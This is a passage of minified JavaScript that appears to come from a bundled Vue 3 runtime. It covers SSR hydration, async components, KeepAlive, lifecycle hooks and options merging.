        leave(y, x) {
            const I = String(e.key);
            if (y[da] && y[da](!0), n.isUnmounting) return x();
            A(d, [y]);
            let T = !1;
            const O = y[An] = L => {
                T || (T = !0, x(), L ? A(m, [y]) : A(b, [y]), y[An] = void 0, w[I] === e && delete w[I])
            };
            w[I] = e, h ? N(h, [y, O]) : O()
        },
        clone(y) {
            const x = Us(y, t, n, r, s);
            return s && s(x), x
        }
    };
    return v
}

function kl(e) {
    if (Fo(e)) return e = mn(e), e.children = null, e
}

function Ld(e) {
    if (!Fo(e)) return I1(e.type) && e.children ? O1(e.children) : e;
    if (e.component) return e.component.subTree;
    const {
        shapeFlag: t,
        children: n
    } = e;
    if (n) {
        if (t & 16) return n[0];
        if (t & 32 && te(n.default)) return n.default()
    }
}

function qn(e, t) {
    e.shapeFlag & 6 && e.component ? (e.transition = t, qn(e.component.subTree, t)) : e.shapeFlag & 128 ? (e.ssContent.transition = t.clone(e.ssContent), e.ssFallback.transition = t.clone(e.ssFallback)) : e.transition = t
}

function Bc(e, t = !1, n) {
    let r = [],
        s = 0;
    for (let i = 0; i < e.length; i++) {
        let o = e[i];
        const a = n == null ? o.key : String(n) + String(o.key != null ? o.key : i);
        o.type === Ne ? (o.patchFlag & 128 && s++, r = r.concat(Bc(o.children, t, a))) : (t || o.type !== Pe) && r.push(a != null ? mn(o, {
            key: a
        }) : o)
    }
    if (s > 1)
        for (let i = 0; i < r.length; i++) r[i].patchFlag = -2;
    return r
}

function U0(e, t) {
    return te(e) ? ae({
        name: e.name
    }, t, {
        setup: e
    }) : e
}

function S5() {
    const e = vt();
    return e ? (e.appContext.config.idPrefix || "v") + "-" + e.ids[0] + e.ids[1]++ : ""
}

function V0(e) {
    e.ids = [e.ids[0] + e.ids[2]++ + "-", 0, 0]
}

function C5(e) {
    const t = vt(),
        n = b1(null);
    if (t) {
        const s = t.refs === ue ? t.refs = {} : t.refs;
        Object.defineProperty(s, e, {
            enumerable: !0,
            get: () => n.value,
            set: i => n.value = i
        })
    }
    return n
}
const qa = new WeakMap;

function Os(e, t, n, r, s = !1) {
    if (K(e)) {
        e.forEach((b, m) => Os(b, t && (K(t) ? t[m] : t), n, r, s));
        return
    }
    if (pr(r) && !s) {
        r.shapeFlag & 512 && r.type.__asyncResolved && r.component.subTree.component && Os(e, t, n, r.component.subTree);
        return
    }
    const i = r.shapeFlag & 4 ? Ho(r.component) : r.el,
        o = s ? null : i,
        {
            i: a,
            r: c
        } = e,
        u = t && t.r,
        l = a.refs === ue ? a.refs = {} : a.refs,
        f = a.setupState,
        d = he(f),
        h = f === ue ? $r : b => pe(d, b);
    if (u != null && u !== c) {
        if ($d(t), re(u)) l[u] = null, h(u) && (f[u] = null);
        else if (ke(u)) {
            u.value = null;
            const b = t;
            b.k && (l[b.k] = null)
        }
    }
    if (te(c)) oi(c, a, 12, [o, l]);
    else {
        const b = re(c),
            m = ke(c);
        if (b || m) {
            const _ = () => {
                if (e.f) {
                    const E = b ? h(c) ? f[c] : l[c] : c.value;
                    if (s) K(E) && Sc(E, i);
                    else if (K(E)) E.includes(i) || E.push(i);
                    else if (b) l[c] = [i], h(c) && (f[c] = l[c]);
                    else {
                        const S = [i];
                        c.value = S, e.k && (l[e.k] = S)
                    }
                } else b ? (l[c] = o, h(c) && (f[c] = o)) : m && (c.value = o, e.k && (l[e.k] = o))
            };
            if (o) {
                const E = () => {
                    _(), qa.delete(e)
                };
                E.id = -1, qa.set(e, E), Re(E, n)
            } else $d(e), _()
        }
    }
}

function $d(e) {
    const t = qa.get(e);
    t && (t.flags |= 8, qa.delete(e))
}
let Dd = !1;
const gs = () => {
        Dd || (console.error("Hydration completed but contains mismatches."), Dd = !0)
    },
    I5 = e => e.namespaceURI.includes("svg") && e.tagName !== "foreignObject",
    A5 = e => e.namespaceURI.includes("MathML"),
    ha = e => {
        if (e.nodeType === 1) {
            if (I5(e)) return "svg";
            if (A5(e)) return "mathml"
        }
    },
    Ss = e => e.nodeType === 8;

function N5(e) {
    const {
        mt: t,
        p: n,
        o: {
            patchProp: r,
            createText: s,
            nextSibling: i,
            parentNode: o,
            remove: a,
            insert: c,
            createComment: u
        }
    } = e, l = (g, p) => {
        if (!p.hasChildNodes()) {
            n(null, g, p), za(), p._vnode = g;
            return
        }
        f(p.firstChild, g, null, null, null), za(), p._vnode = g
    }, f = (g, p, w, A, N, v = !1) => {
        v = v || !!p.dynamicChildren;
        const y = Ss(g) && g.data === "[",
            x = () => m(g, p, w, A, N, y),
            {
                type: I,
                ref: T,
                shapeFlag: O,
                patchFlag: L
            } = p;
        let k = g.nodeType;
        p.el = g, L === -2 && (v = !1, p.dynamicChildren = null);
        let R = null;
        switch (I) {
            case mr:
                k !== 3 ? p.children === "" ? (c(p.el = s(""), o(g), g), R = g) : R = x() : (g.data !== p.children && (gs(), g.data = p.children), R = i(g));
                break;
            case Pe:
                S(g) ? (R = i(g), E(p.el = g.content.firstChild, g, w)) : k !== 8 || y ? R = x() : R = i(g);
                break;
            case Wr:
                if (y && (g = i(g), k = g.nodeType), k === 1 || k === 3) {
                    R = g;
                    const D = !p.children.length;
                    for (let B = 0; B < p.staticCount; B++) D && (p.children += R.nodeType === 1 ? R.outerHTML : R.data), B === p.staticCount - 1 && (p.anchor = R), R = i(R);
                    return y ? i(R) : R
                } else x();
                break;
            case Ne:
                y ? R = b(g, p, w, A, N, v) : R = x();
                break;
            default:
                if (O & 1)(k !== 1 || p.type.toLowerCase() !== g.tagName.toLowerCase()) && !S(g) ? R = x() : R = d(g, p, w, A, N, v);
                else if (O & 6) {
                    p.slotScopeIds = N;
                    const D = o(g);
                    if (y ? R = _(g) : Ss(g) && g.data === "teleport start" ? R = _(g, g.data, "teleport end") : R = i(g), t(p, D, null, w, A, ha(D), v), pr(p) && !p.type.__asyncResolved) {
                        let B;
                        y ? (B = Te(Ne), B.anchor = R ? R.previousSibling : D.lastChild) : B = g.nodeType === 3 ? Nn("") : Te("div"), B.el = g, p.component.subTree = B
                    }
                } else O & 64 ? k !== 8 ? R = x() : R = p.type.hydrate(g, p, w, A, N, v, e, h) : O & 128 && (R = p.type.hydrate(g, p, w, A, ha(o(g)), N, v, e, f))
        }
        return T != null && Os(T, null, A, p), R
    }, d = (g, p, w, A, N, v) => {
        v = v || !!p.dynamicChildren;
        const {
            type: y,
            props: x,
            patchFlag: I,
            shapeFlag: T,
            dirs: O,
            transition: L
        } = p, k = y === "input" || y === "option";
        if (k || I !== -1) {
            O && fn(p, null, w, "created");
            let R = !1;
            if (S(g)) {
                R = f2(null, L) && w && w.vnode.props && w.vnode.props.appear;
                const B = g.content.firstChild;
                if (R) {
                    const q = B.getAttribute("class");
                    q && (B.$cls = q), L.beforeEnter(B)
                }
                E(B, g, w), p.el = g = B
            }
            if (T & 16 && !(x && (x.innerHTML || x.textContent))) {
                let B = h(g.firstChild, p, g, w, A, N, v);
                for (; B;) {
                    pa(g, 1) || gs();
                    const q = B;
                    B = B.nextSibling, a(q)
                }
            } else if (T & 8) {
                let B = p.children;
                B[0] === `
` && (g.tagName === "PRE" || g.tagName === "TEXTAREA") && (B = B.slice(1));
                const {
                    textContent: q
                } = g;
                q !== B && q !== B.replace(/\r\n|\r/g, `
`) && (pa(g, 0) || gs(), g.textContent = p.children)
            }
            if (x) {
                if (k || !v || I & 48) {
                    const B = g.tagName.includes("-");
                    for (const q in x)(k && (q.endsWith("value") || q === "indeterminate") || vr(q) && !Bn(q) || q[0] === "." || B) && r(g, q, null, x[q], void 0, w)
                } else if (x.onClick) r(g, "onClick", null, x.onClick, void 0, w);
                else if (I & 4 && Ln(x.style))
                    for (const B in x.style) x.style[B]
            }
            let D;
            (D = x && x.onVnodeBeforeMount) && bt(D, w, p), O && fn(p, null, w, "beforeMount"), ((D = x && x.onVnodeMounted) || O || R) && p2(() => {
                D && bt(D, w, p), R && L.enter(g), O && fn(p, null, w, "mounted")
            }, A)
        }
        return g.nextSibling
    }, h = (g, p, w, A, N, v, y) => {
        y = y || !!p.dynamicChildren;
        const x = p.children,
            I = x.length;
        for (let T = 0; T < I; T++) {
            const O = y ? x[T] : x[T] = xt(x[T]),
                L = O.type === mr;
            g ? (L && !y && T + 1 < I && xt(x[T + 1]).type === mr && (c(s(g.data.slice(O.children.length)), w, i(g)), g.data = O.children), g = f(g, O, A, N, v, y)) : L && !O.children ? c(O.el = s(""), w) : (pa(w, 1) || gs(), n(null, O, w, null, A, N, ha(w), v))
        }
        return g
    }, b = (g, p, w, A, N, v) => {
        const {
            slotScopeIds: y
        } = p;
        y && (N = N ? N.concat(y) : y);
        const x = o(g),
            I = h(i(g), p, x, w, A, N, v);
        return I && Ss(I) && I.data === "]" ? i(p.anchor = I) : (gs(), c(p.anchor = u("]"), x, I), I)
    }, m = (g, p, w, A, N, v) => {
        if (pa(g.parentElement, 1) || gs(), p.el = null, v) {
            const I = _(g);
            for (;;) {
                const T = i(g);
                if (T && T !== I) a(T);
                else break
            }
        }
        const y = i(g),
            x = o(g);
        return a(g), n(null, p, x, y, w, A, ha(x), N), w && (w.vnode.el = p.el, Vc(w, p.el)), y
    }, _ = (g, p = "[", w = "]") => {
        let A = 0;
        for (; g;)
            if (g = i(g), g && Ss(g) && (g.data === p && A++, g.data === w)) {
                if (A === 0) return i(g);
                A--
            } return g
    }, E = (g, p, w) => {
        const A = p.parentNode;
        A && A.replaceChild(g, p);
        let N = w;
        for (; N;) N.vnode.el === p && (N.vnode.el = N.subTree.el = g), N = N.parent
    }, S = g => g.nodeType === 1 && g.tagName === "TEMPLATE";
    return [l, f]
}
const Fd = "data-allow-mismatch",
    P5 = {
        0: "text",
        1: "children",
        2: "class",
        3: "style",
        4: "attribute"
    };

function pa(e, t) {
    if (t === 0 || t === 1)
        for (; e && !e.hasAttribute(Fd);) e = e.parentElement;
    const n = e && e.getAttribute(Fd);
    if (n == null) return !1;
    if (n === "") return !0;
    {
        const r = n.split(",");
        return t === 0 && r.includes("children") ? !0 : r.includes(P5[t])
    }
}
const O5 = Bo().requestIdleCallback || (e => setTimeout(e, 1)),
    R5 = Bo().cancelIdleCallback || (e => clearTimeout(e)),
    M5 = (e = 1e4) => t => {
        const n = O5(t, {
            timeout: e
        });
        return () => R5(n)
    };

function k5(e) {
    const {
        top: t,
        left: n,
        bottom: r,
        right: s
    } = e.getBoundingClientRect(), {
        innerHeight: i,
        innerWidth: o
    } = window;
    return (t > 0 && t < i || r > 0 && r < i) && (n > 0 && n < o || s > 0 && s < o)
}
const B5 = e => (t, n) => {
        const r = new IntersectionObserver(s => {
            for (const i of s)
                if (i.isIntersecting) {
                    r.disconnect(), t();
                    break
                }
        }, e);
        return n(s => {
            if (s instanceof Element) {
                if (k5(s)) return t(), r.disconnect(), !1;
                r.observe(s)
            }
        }), () => r.disconnect()
    },
    L5 = e => t => {
        if (e) {
            const n = matchMedia(e);
            if (n.matches) t();
            else return n.addEventListener("change", t, {
                once: !0
            }), () => n.removeEventListener("change", t)
        }
    },
    $5 = (e = []) => (t, n) => {
        re(e) && (e = [e]);
        let r = !1;
        const s = o => {
                r || (r = !0, i(), t(), o.target.dispatchEvent(new o.constructor(o.type, o)))
            },
            i = () => {
                n(o => {
                    for (const a of e) o.removeEventListener(a, s)
                })
            };
        return n(o => {
            for (const a of e) o.addEventListener(a, s, {
                once: !0
            })
        }), i
    };

function D5(e, t) {
    if (Ss(e) && e.data === "[") {
        let n = 1,
            r = e.nextSibling;
        for (; r;) {
            if (r.nodeType === 1) {
                if (t(r) === !1) break
            } else if (Ss(r))
                if (r.data === "]") {
                    if (--n === 0) break
                } else r.data === "[" && n++;
            r = r.nextSibling
        }
    } else t(e)
}
const pr = e => !!e.type.__asyncLoader;

function F5(e) {
    te(e) && (e = {
        loader: e
    });
    const {
        loader: t,
        loadingComponent: n,
        errorComponent: r,
        delay: s = 200,
        hydrate: i,
        timeout: o,
        suspensible: a = !0,
        onError: c
    } = e;
    let u = null,
        l, f = 0;
    const d = () => (f++, u = null, h()),
        h = () => {
            let b;
            return u || (b = u = t().catch(m => {
                if (m = m instanceof Error ? m : new Error(String(m)), c) return new Promise((_, E) => {
                    c(m, () => _(d()), () => E(m), f + 1)
                });
                throw m
            }).then(m => b !== u && u ? u : (m && (m.__esModule || m[Symbol.toStringTag] === "Module") && (m = m.default), l = m, m)))
        };
    return U0({
        name: "AsyncComponentWrapper",
        __asyncLoader: h,
        __asyncHydrate(b, m, _) {
            let E = !1;
            (m.bu || (m.bu = [])).push(() => E = !0);
            const S = () => {
                    E || _()
                },
                g = i ? () => {
                    const p = i(S, w => D5(b, w));
                    p && (m.bum || (m.bum = [])).push(p)
                } : S;
            l ? g() : h().then(() => !m.isUnmounted && g())
        },
        get __asyncResolved() {
            return l
        },
        setup() {
            const b = qe;
            if (V0(b), l) return () => ma(l, b);
            const m = g => {
                u = null, ds(g, b, 13, !r)
            };
            if (a && b.suspense || Vs) return h().then(g => () => ma(g, b)).catch(g => (m(g), () => r ? Te(r, {
                error: g
            }) : null));
            const _ = Li(!1),
                E = Li(),
                S = Li(!!s);
            return s && setTimeout(() => {
                S.value = !1
            }, s), o != null && setTimeout(() => {
                if (!_.value && !E.value) {
                    const g = new Error(`Async component timed out after ${o}ms.`);
                    m(g), E.value = g
                }
            }, o), h().then(() => {
                _.value = !0, b.parent && Fo(b.parent.vnode) && b.parent.update()
            }).catch(g => {
                m(g), E.value = g
            }), () => {
                if (_.value && l) return ma(l, b);
                if (E.value && r) return Te(r, {
                    error: E.value
                });
                if (n && !S.value) return ma(n, b)
            }
        }
    })
}

function ma(e, t) {
    const {
        ref: n,
        props: r,
        children: s,
        ce: i
    } = t.vnode, o = Te(e, r, s);
    return o.ref = n, o.ce = i, delete t.vnode.ce, o
}
const Fo = e => e.type.__isKeepAlive,
    U5 = {
        name: "KeepAlive",
        __isKeepAlive: !0,
        props: {
            include: [String, RegExp, Array],
            exclude: [String, RegExp, Array],
            max: [String, Number]
        },
        setup(e, {
            slots: t
        }) {
            const n = vt(),
                r = n.ctx;
            if (!r.renderer) return () => {
                const S = t.default && t.default();
                return S && S.length === 1 ? S[0] : S
            };
            const s = new Map,
                i = new Set;
            let o = null;
            const a = n.suspense,
                {
                    renderer: {
                        p: c,
                        m: u,
                        um: l,
                        o: {
                            createElement: f
                        }
                    }
                } = r,
                d = f("div");
            r.activate = (S, g, p, w, A) => {
                const N = S.component;
                u(S, g, p, 0, a), c(N.vnode, S, g, p, N, a, w, S.slotScopeIds, A), Re(() => {
                    N.isDeactivated = !1, N.a && zr(N.a);
                    const v = S.props && S.props.onVnodeMounted;
                    v && bt(v, N.parent, S)
                }, a)
            }, r.deactivate = S => {
                const g = S.component;
                Wa(g.m), Wa(g.a), u(S, d, null, 1, a), Re(() => {
                    g.da && zr(g.da);
                    const p = S.props && S.props.onVnodeUnmounted;
                    p && bt(p, g.parent, S), g.isDeactivated = !0
                }, a)
            };

            function h(S) {
                Bl(S), l(S, n, a, !0)
            }

            function b(S) {
                s.forEach((g, p) => {
                    const w = Pu(g.type);
                    w && !S(w) && m(p)
                })
            }

            function m(S) {
                const g = s.get(S);
                g && (!o || !Xt(g, o)) ? h(g) : o && Bl(o), s.delete(S), i.delete(S)
            }
            Rs(() => [e.include, e.exclude], ([S, g]) => {
                S && b(p => Oi(S, p)), g && b(p => !Oi(g, p))
            }, {
                flush: "post",
                deep: !0
            });
            let _ = null;
            const E = () => {
                _ != null && (Xa(n.subTree.type) ? Re(() => {
                    s.set(_, ba(n.subTree))
                }, n.subTree.suspense) : s.set(_, ba(n.subTree)))
            };
            return Uo(E), $c(E), Dc(() => {
                s.forEach(S => {
                    const {
                        subTree: g,
                        suspense: p
                    } = n, w = ba(g);
                    if (S.type === w.type && S.key === w.key) {
                        Bl(w);
                        const A = w.component.da;
                        A && Re(A, p);
                        return
                    }
                    h(S)
                })
            }), () => {
                if (_ = null, !t.default) return o = null;
                const S = t.default(),
                    g = S[0];
                if (S.length > 1) return o = null, S;
                if (!Gn(g) || !(g.shapeFlag & 4) && !(g.shapeFlag & 128)) return o = null, g;
                let p = ba(g);
                if (p.type === Pe) return o = null, p;
                const w = p.type,
                    A = Pu(pr(p) ? p.type.__asyncResolved || {} : w),
                    {
                        include: N,
                        exclude: v,
                        max: y
                    } = e;
                if (N && (!A || !Oi(N, A)) || v && A && Oi(v, A)) return p.shapeFlag &= -257, o = p, g;
                const x = p.key == null ? w : p.key,
                    I = s.get(x);
                return p.el && (p = mn(p), g.shapeFlag & 128 && (g.ssContent = p)), _ = x, I ? (p.el = I.el, p.component = I.component, p.transition && qn(p, p.transition), p.shapeFlag |= 512, i.delete(x), i.add(x)) : (i.add(x), y && i.size > parseInt(y, 10) && m(i.values().next().value)), p.shapeFlag |= 256, o = p, Xa(g.type) ? g : p
            }
        }
    },
    V5 = U5;

function Oi(e, t) {
    return K(e) ? e.some(n => Oi(n, t)) : re(e) ? e.split(",").includes(t) : $p(e) ? (e.lastIndex = 0, e.test(t)) : !1
}

function k1(e, t) {
    L1(e, "a", t)
}

function B1(e, t) {
    L1(e, "da", t)
}

function L1(e, t, n = qe) {
    const r = e.__wdc || (e.__wdc = () => {
        let s = n;
        for (; s;) {
            if (s.isDeactivated) return;
            s = s.parent
        }
        return e()
    });
    if (Lc(t, r, n), n) {
        let s = n.parent;
        for (; s && s.parent;) Fo(s.parent.vnode) && H5(r, t, n, s), s = s.parent
    }
}

function H5(e, t, n, r) {
    const s = Lc(t, e, r, !0);
    Fc(() => {
        Sc(r[t], s)
    }, n)
}

function Bl(e) {
    e.shapeFlag &= -257, e.shapeFlag &= -513
}

function ba(e) {
    return e.shapeFlag & 128 ? e.ssContent : e
}

function Lc(e, t, n = qe, r = !1) {
    if (n) {
        const s = n[e] || (n[e] = []),
            i = t.__weh || (t.__weh = (...o) => {
                jn();
                const a = Qr(n),
                    c = jt(t, n, e, o);
                return a(), zn(), c
            });
        return r ? s.unshift(i) : s.push(i), i
    }
}
const er = e => (t, n = qe) => {
        (!Vs || e === "sp") && Lc(e, (...r) => t(...r), n)
    },
    $1 = er("bm"),
    Uo = er("m"),
    H0 = er("bu"),
    $c = er("u"),
    Dc = er("bum"),
    Fc = er("um"),
    D1 = er("sp"),
    F1 = er("rtg"),
    U1 = er("rtc");

function V1(e, t = qe) {
    Lc("ec", e, t)
}
const j0 = "components",
    j5 = "directives";

function z5(e, t) {
    return z0(j0, e, !0, t) || e
}
const H1 = Symbol.for("v-ndc");

function q5(e) {
    return re(e) ? z0(j0, e, !1) || e : e || H1
}

function j1(e) {
    return z0(j5, e)
}

function z0(e, t, n = !0, r = !1) {
    const s = Ge || qe;
    if (s) {
        const i = s.type;
        if (e === j0) {
            const a = Pu(i, !1);
            if (a && (a === t || a === _e(t) || a === Sr(_e(t)))) return i
        }
        const o = Ud(s[e] || i[e], t) || Ud(s.appContext[e], t);
        return !o && r ? i : o
    }
}

function Ud(e, t) {
    return e && (e[t] || e[_e(t)] || e[Sr(_e(t))])
}

function Ia(e, t, n, r) {
    let s;
    const i = n && n[r],
        o = K(e);
    if (o || re(e)) {
        const a = o && Ln(e);
        let c = !1,
            u = !1;
        a && (c = !_t(e), u = pn(e), e = Nc(e)), s = new Array(e.length);
        for (let l = 0, f = e.length; l < f; l++) s[l] = t(c ? u ? Fs(Yt(e[l])) : Yt(e[l]) : e[l], l, void 0, i && i[l])
    } else if (typeof e == "number") {
        s = new Array(e);
        for (let a = 0; a < e; a++) s[a] = t(a + 1, a, void 0, i && i[a])
    } else if (me(e))
        if (e[Symbol.iterator]) s = Array.from(e, (a, c) => t(a, c, void 0, i && i[c]));
        else {
            const a = Object.keys(e);
            s = new Array(a.length);
            for (let c = 0, u = a.length; c < u; c++) {
                const l = a[c];
                s[c] = t(e[l], l, c, i && i[c])
            }
        }
    else s = [];
    return n && (n[r] = s), s
}

function G5(e, t) {
    for (let n = 0; n < t.length; n++) {
        const r = t[n];
        if (K(r))
            for (let s = 0; s < r.length; s++) e[r[s].name] = r[s].fn;
        else r && (e[r.name] = r.key ? (...s) => {
            const i = r.fn(...s);
            return i && (i.key = r.key), i
        } : r.fn)
    }
    return e
}

function W5(e, t, n = {}, r, s) {
    if (Ge.ce || Ge.parent && pr(Ge.parent) && Ge.parent.ce) {
        const u = Object.keys(n).length > 0;
        return t !== "default" && (n.name = t), Ue(), Ka(Ne, null, [Te("slot", n, r && r())], u ? -2 : 64)
    }
    let i = e[t];
    i && i._c && (i._d = !1), Ue();
    const o = i && q0(i(n)),
        a = n.key || o && o.key,
        c = Ka(Ne, {
            key: (a && !ft(a) ? a : `_${t}`) + (!o && r ? "_fb" : "")
        }, o || (r ? r() : []), o && e._ === 1 ? 64 : -2);
    return !s && c.scopeId && (c.slotScopeIds = [c.scopeId + "-s"]), i && i._c && (i._d = !0), c
}

function q0(e) {
    return e.some(t => Gn(t) ? !(t.type === Pe || t.type === Ne && !q0(t.children)) : !0) ? e : null
}

function X5(e, t) {
    const n = {};
    for (const r in e) n[t && /[A-Z]/.test(r) ? `on:${r}` : jr(r)] = e[r];
    return n
}
const wu = e => e ? v2(e) ? Ho(e) : wu(e.parent) : null,
    Di = ae(Object.create(null), {
        $: e => e,
        $el: e => e.vnode.el,
        $data: e => e.data,
        $props: e => e.props,
        $attrs: e => e.attrs,
        $slots: e => e.slots,
        $refs: e => e.refs,
        $parent: e => wu(e.parent),
        $root: e => wu(e.root),
        $host: e => e.ce,
        $emit: e => e.emit,
        $options: e => G0(e),
        $forceUpdate: e => e.f || (e.f = () => {
            L0(e.update)
        }),
        $nextTick: e => e.n || (e.n = Mc.bind(e.proxy)),
        $watch: e => y6.bind(e)
    }),
    Ll = (e, t) => e !== ue && !e.__isScriptSetup && pe(e, t),
    _u = {
        get({
            _: e
        }, t) {
            if (t === "__v_skip") return !0;
            const {
                ctx: n,
                setupState: r,
                data: s,
                props: i,
                accessCache: o,
                type: a,
                appContext: c
            } = e;
            if (t[0] !== "$") {
                const d = o[t];
                if (d !== void 0) switch (d) {
                    case 1:
                        return r[t];
                    case 2:
                        return s[t];
                    case 4:
                        return n[t];
                    case 3:
                        return i[t]
                } else {
                    if (Ll(r, t)) return o[t] = 1, r[t];
                    if (s !== ue && pe(s, t)) return o[t] = 2, s[t];
                    if (pe(i, t)) return o[t] = 3, i[t];
                    if (n !== ue && pe(n, t)) return o[t] = 4, n[t];
                    Eu && (o[t] = 0)
                }
            }
            const u = Di[t];
            let l, f;
            if (u) return t === "$attrs" && tt(e.attrs, "get", ""), u(e);
            if ((l = a.__cssModules) && (l = l[t])) return l;
            if (n !== ue && pe(n, t)) return o[t] = 4, n[t];
            if (f = c.config.globalProperties, pe(f, t)) return f[t]
        },
        set({
            _: e
        }, t, n) {
            const {
                data: r,
                setupState: s,
                ctx: i
            } = e;
            return Ll(s, t) ? (s[t] = n, !0) : r !== ue && pe(r, t) ? (r[t] = n, !0) : pe(e.props, t) || t[0] === "$" && t.slice(1) in e ? !1 : (i[t] = n, !0)
        },
        has({
            _: {
                data: e,
                setupState: t,
                accessCache: n,
                ctx: r,
                appContext: s,
                props: i,
                type: o
            }
        }, a) {
            let c;
            return !!(n[a] || e !== ue && a[0] !== "$" && pe(e, a) || Ll(t, a) || pe(i, a) || pe(r, a) || pe(Di, a) || pe(s.config.globalProperties, a) || (c = o.__cssModules) && c[a])
        },
        defineProperty(e, t, n) {
            return n.get != null ? e._.accessCache[t] = 0 : pe(n, "value") && this.set(e, t, n.value, null), Reflect.defineProperty(e, t, n)
        }
    },
    K5 = ae({}, _u, {
        get(e, t) {
            if (t !== Symbol.unscopables) return _u.get(e, t, e)
        },
        has(e, t) {
            return t[0] !== "_" && !A0(t)
        }
    });

function Z5() {
    return null
}

function Y5() {
    return null
}

function J5(e) {}

function Q5(e) {}

function e6() {
    return null
}

function t6() {}

function n6(e, t) {
    return null
}

function r6() {
    return z1().slots
}

function s6() {
    return z1().attrs
}

function z1(e) {
    const t = vt();
    return t.setupContext || (t.setupContext = C2(t))
}

function Zi(e) {
    return K(e) ? e.reduce((t, n) => (t[n] = null, t), {}) : e
}

function i6(e, t) {
    const n = Zi(e);
    for (const r in t) {
        if (r.startsWith("__skip")) continue;
        let s = n[r];
        s ? K(s) || te(s) ? s = n[r] = {
            type: s,
            default: t[r]
        } : s.default = t[r] : s === null && (s = n[r] = {
            default: t[r]
        }), s && t[`__skip_${r}`] && (s.skipFactory = !0)
    }
    return n
}

function o6(e, t) {
    return !e || !t ? e || t : K(e) && K(t) ? e.concat(t) : ae({}, Zi(e), Zi(t))
}

function a6(e, t) {
    const n = {};
    for (const r in e) t.includes(r) || Object.defineProperty(n, r, {
        enumerable: !0,
        get: () => e[r]
    });
    return n
}

function c6(e) {
    const t = vt();
    let n = e();
    return Iu(), Cc(n) && (n = n.catch(r => {
        throw Qr(t), r
    })), [n, () => Qr(t)]
}
let Eu = !0;

function l6(e) {
    const t = G0(e),
        n = e.proxy,
        r = e.ctx;
    Eu = !1, t.beforeCreate && Vd(t.beforeCreate, e, "bc");
    const {
        data: s,
        computed: i,
        methods: o,
        watch: a,
        provide: c,
        inject: u,
        created: l,
        beforeMount: f,
        mounted: d,
        beforeUpdate: h,
        updated: b,
        activated: m,
        deactivated: _,
        beforeDestroy: E,
        beforeUnmount: S,
        destroyed: g,
        unmounted: p,
        render: w,
        renderTracked: A,
        renderTriggered: N,
        errorCaptured: v,
        serverPrefetch: y,
        expose: x,
        inheritAttrs: I,
        components: T,
        directives: O,
        filters: L
    } = t;
    if (u && u6(u, r, null), o)
        for (const D in o) {
            const B = o[D];
            te(B) && (r[D] = B.bind(n))
        }
    if (s) {
        const D = s.call(n, n);
        me(D) && (e.data = Oc(D))
    }
    if (Eu = !0, i)
        for (const D in i) {
            const B = i[D],
                q = te(B) ? B.bind(n, n) : te(B.get) ? B.get.bind(n, n) : He,
                Q = !te(B) && te(B.set) ? B.set.bind(n) : He,
                se = I2({
                    get: q,
                    set: Q
                });
            Object.defineProperty(r, D, {
                enumerable: !0,
                configurable: !0,
                get: () => se.value,
                set: le => se.value = le
            })
        }
    if (a)
        for (const D in a) q1(a[D], r, n, D);
    if (c) {
        const D = te(c) ? c.call(n) : c;
        Reflect.ownKeys(D).forEach(B => {
            W1(B, D[B])
        })
    }
    l && Vd(l, e, "c");

    function R(D, B) {
        K(B) ? B.forEach(q => D(q.bind(n))) : B && D(B.bind(n))
    }
    if (R($1, f), R(Uo, d), R(H0, h), R($c, b), R(k1, m), R(B1, _), R(V1, v), R(U1, A), R(F1, N), R(Dc, S), R(Fc, p), R(D1, y), K(x))
        if (x.length) {
            const D = e.exposed || (e.exposed = {});
            x.forEach(B => {
                Object.defineProperty(D, B, {
                    get: () => n[B],
                    set: q => n[B] = q,
                    enumerable: !0
                })
            })
        } else e.exposed || (e.exposed = {});
    w && e.render === He && (e.render = w), I != null && (e.inheritAttrs = I), T && (e.components = T), O && (e.directives = O), y && V0(e)
}

function u6(e, t, n = He) {
    K(e) && (e = vu(e));
    for (const r in e) {
        const s = e[r];
        let i;
        me(s) ? "default" in s ? i = Fi(s.from || r, s.default, !0) : i = Fi(s.from || r) : i = Fi(s), ke(i) ? Object.defineProperty(t, r, {
            enumerable: !0,
            configurable: !0,
            get: () => i.value,
            set: o => i.value = o
        }) : t[r] = i
    }
}

function Vd(e, t, n) {
    jt(K(e) ? e.map(r => r.bind(t.proxy)) : e.bind(t.proxy), t, n)
}

function q1(e, t, n, r) {
    let s = r.includes(".") ? Y1(n, r) : () => n[r];
    if (re(e)) {
        const i = t[e];
        te(i) && Rs(s, i)
    } else if (te(e)) Rs(s, e.bind(n));
    else if (me(e))
        if (K(e)) e.forEach(i => q1(i, t, n, r));
        else {
            const i = te(e.handler) ? e.handler.bind(n) : t[e.handler];
            te(i) && Rs(s, i, e)
        }
}

function G0(e) {
    const t = e.type,
        {
            mixins: n,
            extends: r
        } = t,
        {
            mixins: s,
            optionsCache: i,
            config: {
                optionMergeStrategies: o
            }
        } = e.appContext,
        a = i.get(t);
    let c;
    return a ? c = a : !s.length && !n && !r ? c = t : (c = {}, s.length && s.forEach(u => Ga(c, u, o, !0)), Ga(c, t, o)), me(t) && i.set(t, c), c
}

function Ga(e, t, n, r = !1) {
    const {
        mixins: s,
        extends: i
    } = t;
    i && Ga(e, i, n, !0), s && s.forEach(o => Ga(e, o, n, !0));
    for (const o in t)
        if (!(r && o === "expose")) {
            const a = f6[o] || n && n[o];
            e[o] = a ? a(e[o], t[o]) : t[o]
        } return e
}
const f6 = {
    data: Hd,
    props: jd,
    emits: jd,
    methods: Ri,
    computed: Ri,
    beforeCreate: it,
    created: it,
    beforeMount: it,
    mounted: it,
    beforeUpdate: it,
    updated: it,
    beforeDestroy: it,
    beforeUnmount: it,
    destroyed: it,
    unmounted: it,
    activated: it,
    deactivated: it,
    errorCaptured: it,
    serverPrefetch: it,
    components: Ri,
    directives: Ri,
    watch: h6,
    provide: Hd,
    inject: d6
};

function Hd(e, t) {
    return t ? e ? function() {
        return ae(te(e) ? e.call(this, this) : e, te(t) ? t.call(this, this) : t)
    } : t : e
}

function d6(e, t) {
    return Ri(vu(e), vu(t))
}

function vu(e) {
    if (K(e)) {
        const t = {};
        for (let n = 0; n < e.length; n++) t[e[n]] = e[n];
        return t
    }
    return e
}

function it(e, t) {
    return e ? [...new Set([].concat(e, t))] : t
}

function Ri(e, t) {
    return e ? ae(Object.create(null), e, t) : t
}

function jd(e, t) {
    return e ? K(e) && K(t) ? [...new Set([...e, ...t])] : ae(Object.create(null), Zi(e), Zi(t ?? {})) : t
}

function h6(e, t) {
    if (!e) return t;
    if (!t) return e;
    const n = ae(Object.create(null), e);
    for (const r in t) n[r] = it(e[r], t[r]);
    return n
}

function G1() {
    return {
        app: null,
        config: {
